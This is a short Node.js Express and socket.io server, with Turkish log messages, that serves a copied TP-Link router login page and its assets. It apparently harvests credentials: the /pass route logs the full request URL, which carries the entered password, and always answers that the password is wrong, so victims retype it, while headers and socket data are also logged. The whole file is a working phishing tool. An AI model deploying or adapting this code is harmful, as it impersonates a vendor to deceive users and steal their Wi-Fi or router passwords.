const app = require('express')();
const http = require('http').Server(app);
const io = require('socket.io')(http);
const port = process.env.PORT || 3000;

app.get('/', function(req, res){
  console.log(req.headers)
  res.sendFile(__dirname + '/tplink/tplink.html');
});
io.on('connection', function(socket){
  console.log("Kullancı Bağlandı")
  socket.on('data', function(msg){
    console.log(msg)
  });
  socket.on('disconnect', () => {
    console.log('Bağlantı Kopuldu');
  });
});
app.get("/pass", (req, res)=>{
    console.log(req.originalUrl)
    res.send("Sifre Yanlis Bir Daha Deneyiniz");
})
app.get("/jquery.js", (req, res)=>{
    res.sendFile(__dirname + '/tplink/jquery.js');
})
app.get("/main.css", (req, res)=>{
    res.sendFile(__dirname + '/tplink/tplink.main.css');
})
app.get("/icons.png", (req, res)=>{
    res.sendFile(__dirname + "/tplink/tplink.icons.png");
})
app.get("/favicon.ico", (req, res)=>{
    res.sendFile(__dirname + "/tplink/favicon.ico");
})
http.listen(port, function(){
  console.log('listening on *:' + port);
});